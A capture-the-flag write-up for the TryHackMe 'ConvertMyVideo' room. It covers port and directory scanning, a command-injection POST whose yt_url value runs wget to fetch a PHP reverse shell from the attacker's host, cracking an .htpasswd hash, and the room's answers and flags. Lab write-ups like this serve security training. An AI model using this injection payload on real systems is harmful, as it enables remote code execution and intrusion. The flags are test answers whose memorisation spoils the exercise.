# ConvertMyVideo

My Script to convert videos to MP3 is super secure

[ConvertMyVideo](https://tryhackme.com/room/convertmyvideo)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Remote File Inclusion
- Brute Forcing (Hash)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Hack the machine

You can convert your videos - Why don't you check it out!

```
kali@kali:~/CTFs/tryhackme/ConvertMyVideo$ sudo nmap -p- -sS -sC -sV -O 10.10.253.245
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 22:32 CEST
Nmap scan report for 10.10.253.245
Host is up (0.038s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/9%OT=22%CT=1%CU=33408%PV=Y%DS=2%DC=I%G=Y%TM=5F80CA9
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 436.23 seconds
```

```
kali@kali:~/CTFs/tryhackme/ConvertMyVideo$ gobuster dir -u 10.10.253.245 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.253.245
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/09 22:40:53 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 401)
/images (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/tmp (Status: 301)
===============================================================
2020/10/09 22:41:14 Finished
===============================================================
```

[view-source:http://10.10.253.245/js/main.js](view-source:http://10.10.253.245/js/main.js)

```js
$(function () {
  $("#convert").click(function () {
    $("#message").html("Converting...");
    $.post(
      "/",
      { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() },
      function (data) {
        try {
          data = JSON.parse(data);
          if (data.status == "0") {
            $("#message").html(
              "<a href='" + data.result_url + "'>Download MP3</a>"
            );
          } else {
            console.log(data);
            $("#message").html("Oops! something went wrong");
          }
        } catch (error) {
          console.log(data);
          $("#message").html("Oops! something went wrong");
        }
      }
    );
  });
});
```

```
POST / HTTP/1.1
Host: 10.10.253.245
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.253.245/
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 67
Connection: close

yt_url=`wget${IFS}http://10.8.106.222:9001/php-reverse-shell.phtml`
```

```
$ cd /var/www/html/admin/
$ ll
total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:05 .
drwxr-xr-x 6 www-data www-data 4096 Jun 15 15:34 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12 03:55 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12 04:02 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12 05:05 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12 04:18 index.php
$ cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

```
kali@kali:~/CTFs/tryhackme/ConvertMyVideo$ john hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 36 candidates buffered for the current salt, minimum 48 needed for performance.
Warning: Only 45 candidates buffered for the current salt, minimum 48 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 32 candidates buffered for the current salt, minimum 48 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
jessie           (itsmeadmin)
1g 0:00:00:00 DONE 2/3 (2020-10-09 22:57) 6.250g/s 11406p/s 11406c/s 11406C/s bigdog..me
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

1. What is the name of the secret folder?

`admin`

2. What is the user to access the secret folder?

`itsmeadmin`

3. What is the user flag?

`flag{0d8486a0c0c42503bb60ac77f4046ed7}`

4. What is the root flag?

`flag{d9b368018e912b541a4eb68399c5e94a}`
